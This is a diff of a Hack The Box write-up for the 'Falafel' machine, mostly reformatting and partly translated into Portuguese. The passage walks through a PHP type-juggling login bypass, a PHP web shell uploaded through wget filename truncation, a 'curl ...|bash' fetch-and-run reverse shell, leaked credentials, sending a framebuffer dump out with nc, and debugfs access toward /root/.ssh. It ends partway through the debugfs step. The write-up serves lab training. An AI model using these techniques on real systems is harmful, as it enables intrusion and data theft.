@@ -1,18 +1,17 @@
-![](Assets/HTB-Linux-Hard-Falafel/f9106389d256a42cf41619e85fbd8f01.webp)
+![](Assets/HTB-Linux-Hard-Falafel/icon.webp)
 
-## Testing
+# Resolução da máquina **Falafel**
 
-# Writeup of _Falafel_
+#### Máquina HARD (hackthebox.com)
 
-#### Hard machine (hackthebox.com)
-
-#### Sylvain (Javali) Júlio - 08/09/2021
+#### by **_JavaliMZ_** - 09/09/2021
 
 ---
 
 ---
 
-# Enumeration
+
+# Enumeração
 
 ## Nmap
 
@@ -170,7 +169,7 @@ with online tool called crackstation.net, we got 1 password:
 
 The Chris perfile have a tip. _TYPE-JUGGLING_
 
-The admin hash is 0e462096931906507119562988736854. in php, the string "0e462096931906507119562988736854" == 0 (or "0" or every md5 hash who as "0e{numbers...}") cause php interprete that 0e{numbers...} like 0 * (10 ^ {numbers...}) and, if the comparison is done with the loose comparisons "==" instead of the strict comparisons "===", we can bypass the password with every strings that the hash is 0e{numbers...}. On the internet, we can found a lot of md5 hashes who result in 0e{numbers...}. I will try login with "NWWKITQ"
+The admin hash is 0e462096931906507119562988736854. in php, the string "0e462096931906507119562988736854" == 0 (or "0" or every md5 hash who as "0e{numbers...}") cause php interprete that 0e{numbers...} like 0 \* (10 ^ {numbers...}) and, if the comparison is done with the loose comparisons "==" instead of the strict comparisons "===", we can bypass the password with every strings that the hash is 0e{numbers...}. On the internet, we can found a lot of md5 hashes who result in 0e{numbers...}. I will try login with "NWWKITQ"
 
 > admin:NWWKITQ (Not the real password, just juggling bypass)
 
@@ -186,13 +185,13 @@ At this point, we can try to upload a file. The box suggests a png file.
 sudo python3 -m http.server 80
 ```
 
-
 We can update an image with png extention. but the response is very unusual. That's look the website use "wget" binary for download the file. I tried change extension, MIME type, concate a command (because the server use wget) but nothing work... The way to upload is very tricky! In linux, the maximum size of a name file is 255 chars. And wget as a function that cute the name if is very long!!
 
 ```bash
 # Copy the real image with 251 pattern char and last 4 chars as .png (255 chars)
-cp shell.png $(msf-pattern_create -l 251).png  
+cp shell.png $(msf-pattern_create -l 251).png
 ```
+
 ![Output wget](Assets/HTB-Linux-Hard-Falafel/output_wget.png)
 
 The Output say literally the last 4 chars of the new name file is h7Ah
@@ -201,22 +200,26 @@ The Output say literally the last 4 chars of the new name file is h7Ah
 msf-pattern_offset -q h7Ah
 #>  [*] Exact match at offset 232
 ```
+
 Create a new file named shell.php:
+
 ```php
 <?php
 	echo "\nURL Shell... url?cmd=<command>\n\n";
 	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 ```
+
 We know:
- - The file need to end with ".png" extension
- - The site will interprete php code
- - the wget of the server cut name too long and the exact offset was 232
-So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)
+
+-   The file need to end with ".png" extension
+-   The site will interprete php code
+-   the wget of the server cut name too long and the exact offset was 232 So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)
 
 ```bash
 cp shell.php $(msf-pattern_create -l 232).php.png
 ```
+
 In upload page, get the file and save the output...
 
 > http://10.10.14.17/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
@@ -225,7 +228,7 @@ In upload page, get the file and save the output...
 
 Note the path of the file and go to the webshell
 
->http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami
+> http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami
 
 ![whoami web shell](Assets/HTB-Linux-Hard-Falafel/whoami_web_shell.png)
 
@@ -247,6 +250,7 @@ Then, share a http server and with RCE on website, curl him, and execute him
 sudo python3 -m http.server 80  # On one terminal
 sudo nc -lvnp 443               # On another one
 ```
+
 > http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=curl%20http://10.10.14.17/rev.html|bash
 
 ## PrivEsc
@@ -264,10 +268,11 @@ We found credentials on /var/www/html/connection.php
    // Check connection
    if (mysqli_connect_errno())
    {
-      echo "Failed to connect to MySQL: " . mysqli_connect_error();
+	  echo "Failed to connect to MySQL: " . mysqli_connect_error();
    }
 ?>
 ```
+
 This credentials is for mysql. but if we try to logon as moshe:falafelIsReallyTasty, we will get in.
 
 ### Group video
@@ -275,7 +280,6 @@ This credentials is for mysql. but if we try to logon as moshe:falafelIsReallyTa
 This machine's is a ctf lool. But is interessante the way to escalate privilege. This machine are no more vulnerability... The password is on the screen of the machine. So, how we can screenshot this?
 
 with "w" command we can see the user yossi is logged physically on the machine
-
 
 ```bash
 w
@@ -292,12 +296,14 @@ cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 #> 1176,885
 ```
+
 Download the screen.raw into kali machine
 
 ```bash
 nc 10.10.14.17 443 < /tmp/screen.raw  # Target Machine
 nc -lvnp 443 > screen.raw             # kali Machine
 ```
+
 open with GIMP in mode RAW
 
 ![opennig image raw format with GIMP](Assets/HTB-Linux-Hard-Falafel/Openning_raw_image.png)
@@ -313,6 +319,7 @@ We can now ssh into target machine with yossi user
 ```bash
 for group in $(groups); do echo -e "\n\n\n[*] Archive with group $group permition:\n"; find / -group $group 2>/dev/null; done
 ```
+
 When we run this, we see yossi have permition on /dev/sda1 and more...
 
 ```bash
@@ -323,7 +330,7 @@ fdisk -l
 #>  I/O size (minimum/optimal): 512 bytes / 512 bytes
 #>  Disklabel type: dos
 #>  Disk identifier: 0x01590ad6
-#>  
+#>
 #>  Device     Boot    Start      End  Sectors  Size Id Type
 #>  /dev/sda1  *        2048 14680063 14678016    7G 83 Linux
 #>  /dev/sda2       14682110 16775167  2093058 1022M  5 Extended
@@ -333,10 +340,13 @@ fdisk -l
 ll /dev/sda1
 #>  brw-rw---- 1 root disk 8, 1 Sep  9 12:08 /dev/sda1
 ```
+
 Group disk can read and write on /dev/sda1. But how?
 
 ### debugfs
+
 debugfs - ext2/ext3/ext4 file system debugger. Display or manipulate a disk partition table. We can see easily the flag, but we want to be root!
+
 ```bash
 debugfs /dev/sda1
 debugfs: cd /root/.ssh
